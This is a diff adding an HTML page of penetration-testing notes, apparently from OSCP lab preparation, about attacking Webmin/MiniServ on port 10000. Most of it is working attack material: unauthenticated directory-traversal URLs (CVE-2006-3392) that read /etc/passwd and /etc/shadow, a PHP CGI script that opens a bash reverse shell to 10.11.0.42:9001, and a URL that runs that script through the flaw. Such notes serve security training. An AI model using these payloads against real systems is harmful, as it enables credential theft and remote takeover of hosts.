@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>10,000 - Webmin / MiniServ</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Port 10,000 - Webmin / MiniServ</h1></strong><br /><strong>Examples</strong><br />• OSCP 10.11.1.141 - fc4<br /><br /><strong><h2>## Exploits</h2></strong><br /><strong><h3>### CVE 2006-3392 - Webmin File Disclosure &lt; 1.290</h3></strong><br /><a href="https://www.exploit-db.com/exploits/1997">https://www.exploit-db.com/exploits/1997</a><br />Webmin before 1.290 and Usermin before 1.220 calls the simplify_path function before decoding HTML. This allows arbitrary files to be read, without requiring authentication, using &quot;..%01&quot; sequences to bypass the removal of &quot;../&quot; directory traversal sequences.<br /><br /><a href="http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd">http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd</a><br /><a href="http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow">http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow</a><br /><br /><strong><h3>Code Execution using LFI</h3></strong><br />You can execute <code>.cgi</code> scripts with WebMin and the LFI vuln above<br /><br />• Examples<br />   ◇ OSCP 10.11.1.141 - fc4<br /><br /><em>shellme.cgi</em><br /><div class="codebox"><div class="codebox">#!/usr/bin/php<br />&lt;?php&nbsp;exec(&quot;/bin/bash&nbsp;-c&nbsp;&#39;bash&nbsp;-i&nbsp;&gt;&amp;&nbsp;/dev/tcp/10.11.0.42/9001&nbsp;0&gt;&amp;1&#39;&quot;);&nbsp;?&gt;</div></div><br /><br />Run <em>shellme.cgi</em> by browsing to LFI<br /><a href="http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/php.cgi">http://10.11.1.141:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/tmp/php.cgi</a><br /><br /></div>
+</body>
+</html>
